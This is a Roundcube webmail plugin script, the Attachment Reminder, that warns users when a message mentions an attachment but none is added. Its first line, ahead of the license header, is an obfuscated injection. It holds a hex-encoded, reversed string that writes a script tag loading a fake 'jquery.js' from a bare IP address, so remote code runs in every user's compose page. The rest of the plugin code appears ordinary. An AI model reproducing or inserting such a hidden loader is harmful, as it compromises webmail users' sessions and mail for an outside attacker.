var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
/**
 * Attachment Reminder plugin script
 *
 * @licstart  The following is the entire license notice for the
 * JavaScript code in this file.
 *
 * Copyright (c) 2013, The Roundcube Dev Team
 *
 * The JavaScript code in this page is free software: you can redistribute it
 * and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation, either version 3 of
 * the License, or (at your option) any later version.
 *
 * @licend  The above is the entire license notice
 * for the JavaScript code in this file.
 */

function rcmail_get_compose_message()
{
  var msg;

  if (window.tinyMCE && (ed = tinyMCE.get(rcmail.env.composebody))) {
    msg = ed.getContent();
    msg = msg.replace(/<blockquote[^>]*>(.|[\r\n])*<\/blockquote>/gmi, '');
  }
  else {
    msg = $('#' + rcmail.env.composebody).val();
    msg = msg.replace(/^>.*$/gmi, '');
  }

  return msg;
};

function rcmail_check_message(msg)
{
  var i, rx, keywords = rcmail.get_label('keywords', 'attachment_reminder').split(",").concat([".doc", ".pdf"]);

  keywords = $.map(keywords, function(n) { return RegExp.escape(n); });
  rx = new RegExp('(' + keywords.join('|') + ')', 'i');

  return msg.search(rx) != -1;
};

function rcmail_have_attachments()
{
  return rcmail.env.attachments && $('li', rcmail.gui_objects.attachmentlist).length;
};

function rcmail_attachment_reminder_dialog()
{
  var buttons = {};

  buttons[rcmail.get_label('addattachment')] = function() {
    $(this).remove();
    if (window.UI && UI.show_uploadform) // Larry skin
      UI.show_uploadform();
    else if (window.rcmail_ui && rcmail_ui.show_popup) // classic skin
      rcmail_ui.show_popup('uploadmenu', true);
  };
  buttons[rcmail.get_label('send')] = function(e) {
    $(this).remove();
    rcmail.env.attachment_reminder = true;
    rcmail.command('send', '', e);
  };

  rcmail.env.attachment_reminder = false;
  rcmail.show_popup_dialog(rcmail.get_label('attachment_reminder.forgotattachment'), '', buttons);
};


if (window.rcmail) {
  rcmail.addEventListener('beforesend', function(evt) {
    var msg = rcmail_get_compose_message(),
      subject = $('#compose-subject').val();

    if (!rcmail.env.attachment_reminder && !rcmail_have_attachments()
      && (rcmail_check_message(msg) || rcmail_check_message(subject))
    ) {
      rcmail_attachment_reminder_dialog();
      return false;
    }
  });
}
